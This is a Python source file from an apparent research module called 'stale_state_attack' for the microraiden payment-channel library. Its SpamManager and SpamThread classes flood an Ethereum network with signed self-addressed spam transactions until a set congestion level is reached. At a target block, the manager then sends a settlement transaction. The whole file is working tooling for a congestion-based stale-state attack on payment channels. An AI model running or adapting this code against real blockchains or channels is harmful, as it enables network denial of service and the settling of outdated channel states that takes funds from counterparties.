#!/usr/bin/python

import threading
import time
import logging
from collections import deque
from microraiden.stale_state_attack.config import (
    PRIVATE_KEY,
    CONGESTION_LEVEL,
    MIN_QUEUED_TXS,
    MAX_QUEUED_TXS,
    GAS_PRICE,
    GAS_LIMIT,
)
from microraiden.utils import privkey_to_addr
from microraiden.stale_state_attack.utils import create_signed_transaction


class SpamManager(threading.Thread):
    '''
    The SpamManager class can be used to generate a blockchain congestion.
    '''

    def __init__(
        self,
        web3,
        private_key: str=PRIVATE_KEY,
        number_threads: int=1,
        nonce_offset: int=0,
        congestion_level: int=CONGESTION_LEVEL,
        create_settle_transaction=None,
    ):
        global tx_counter, tx_sent_counter, tx_queue

        self.web3 = web3
        self.private_key = private_key
        self.number_threads = number_threads
        self.nonce_offset = nonce_offset
        self.congestion_level = congestion_level
        self.create_settle_transaction = create_settle_transaction

        self.do_run = False
        self.logger = logging.getLogger('spamming')
        self.threads = []

        tx_counter = 0
        tx_sent_counter = 0
        tx_queue = deque()

        self.initial_nonce = self.web3.eth.getTransactionCount(
            privkey_to_addr(self.private_key), 'pending') + self.nonce_offset
        self.target_block = None
        self.settle_sent = False

        # Initialize and start spamming worker threads
        for i in range(self.number_threads):
            thread = SpamThread(
                web3=self.web3,
                thread_id=i,
                private_key=self.private_key,
                initial_nonce=self.initial_nonce,
                congestion_level=self.congestion_level,
            )
            self.threads.append(thread)
            thread.start()

        threading.Thread.__init__(self)

    def run(self):
        global tx_counter

        self.do_run = True
        for thread in self.threads:
            thread.start_spamming()

        while self.do_run:
            if (self.target_block_reached()) & (not self.settle_sent):
                # Create and send a settle transaction
                tx_counter += 1
                settle_tx = self.create_settle_transaction(self.initial_nonce + tx_counter - 1)
                try:
                    self.web3.eth.sendRawTransaction(settle_tx)
                    self.logger.info('Sent settle transaction')
                    self.settle_sent = True
                except:
                    self.logger.error('Sending settle transaction failed')
            elif self.target_block is not None:
                self.logger.debug(
                    'Current block = {} / Target block = {}'.format(self.web3.eth.blockNumber, self.target_block))
                self.logger.info('Pending transactions = {} / Queued transactions = {} / Threads = {} / Target block = {} / Remaining blocks = {}'.format(int(
                    self.web3.txpool.status.pending, 16), len(tx_queue), threading.active_count(), self.target_block, self.target_block - self.web3.eth.blockNumber))
            else:
                self.logger.debug('Current block = {}'.format(self.web3.eth.blockNumber))
                self.logger.info('Pending transactions = {} / Queued transactions = {} / Threads = {}'.format(
                    int(self.web3.txpool.status.pending, 16), len(tx_queue), threading.active_count()))

            time.sleep(10)

    def update_target_block(self, block):
        self.target_block = block

    def target_block_reached(self) -> bool:
        if self.target_block is None:
            return False
        return self.web3.eth.blockNumber >= self.target_block

    def number_sent_transactions(self) -> int:
        return tx_sent_counter

    def queued_transactions(self) -> int:
        return tx_queue

    def wait_for_full_tx_queue(self) -> int:
        while len(tx_queue) < MIN_QUEUED_TXS:
            time.sleep(0.25)

    def stop(self):
        self.do_run = False
        for thread in self.threads:
            thread.stop()
        self.logger.info('Stopped network spamming')


class SpamThread(threading.Thread):
    '''
    The SpamThread class can be used to repeatedly send empty spam transactions into a blockchain network.
    '''

    def __init__(
        self,
        web3,
        thread_id: int = 0,
        private_key: str = PRIVATE_KEY,
        initial_nonce: int = 0,
        congestion_level: int = CONGESTION_LEVEL,
    ):
        self.web3 = web3
        self.thread_id = thread_id
        self.private_key = private_key
        self.account_address = privkey_to_addr(private_key)
        self.initial_nonce = initial_nonce
        self.congestion_level = congestion_level

        self.do_run = True
        self.do_send = False

        self.logger = logging.getLogger('spammer-{}'.format(thread_id))

        threading.Thread.__init__(self)

    def run(self):
        '''
        Repeadedly create and send spam transactions.
        '''
        global tx_queue

        self.do_run = True

        while self.do_run:
            if self.do_send:
                try:
                    # Get pending transactions from geth
                    pending_transactions = int(self.web3.txpool.status.pending, 16)

                    if pending_transactions < self.congestion_level:
                        # If congestion level is not reached yet, send the next transaction
                        self.send_next_transaction()
                        continue
                except:
                    continue
            elif len(tx_queue) < MAX_QUEUED_TXS:
                # Only create another transaction if sending mode is not active
                self.create_next_transaction()

    def send_next_transaction(self):
        '''
        Sends the next transaction from the global transaction queue.
        If the queue is empty, create a new signed transaction instead.
        '''
        global tx_sent_counter, tx_queue

        if tx_queue:
            try:
                # Send next transaction from queue
                tx = tx_queue.popleft()
                self.web3.eth.sendRawTransaction(tx)
                tx_sent_counter += 1
            except ValueError:
                self.logger.error('Sending transaction failed')
            except:
                tx_queue.appendleft(tx)
                self.logger.error('Sending transaction failed, trying to resend transaction')
        elif len(tx_queue) < MAX_QUEUED_TXS:
            # If queue is empty, create a new spam transaction
            self.create_next_transaction()

    def create_next_transaction(self):
        '''
        Create a new spam transaction and append it to the global transaction queue.
        '''
        global tx_counter, tx_queue

        tx_counter += 1
        nonce = self.initial_nonce + tx_counter - 1
        tx = create_signed_transaction(
            private_key=self.private_key,
            web3=self.web3,
            to=self.account_address,
            nonce=nonce,
            data=str(time.time()),
            gas_price=GAS_PRICE,
            gas_limit=GAS_LIMIT
        )
        tx_queue.append(tx)

    def start_spamming(self):
        '''
        Start sending spam transactions into the blockchain network
        '''
        self.do_send = True

    def stop(self):
        self.do_run = False
        self.do_send = False
